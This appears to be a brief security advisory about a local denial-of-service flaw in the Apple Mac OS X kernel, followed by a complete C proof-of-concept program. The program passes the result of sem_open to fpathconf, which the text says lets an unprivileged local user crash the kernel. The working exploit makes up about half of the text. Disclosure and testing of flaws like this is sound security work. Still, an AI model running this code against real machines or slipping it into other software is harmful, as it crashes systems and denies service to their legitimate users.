Apple Mac OS X is prone to a local denial-of-service vulnerability because the kernel fails to properly handle the execution of a system call.

Exploiting this issue allows local, unprivileged users to crash affected kernels, denying further service to legitimate users.

#include <unistd.h>
#include <semaphore.h>

int main() {
fpathconf(sem_open("DaringWussball", O_CREAT, S_IRWXU, 1), 0);
}
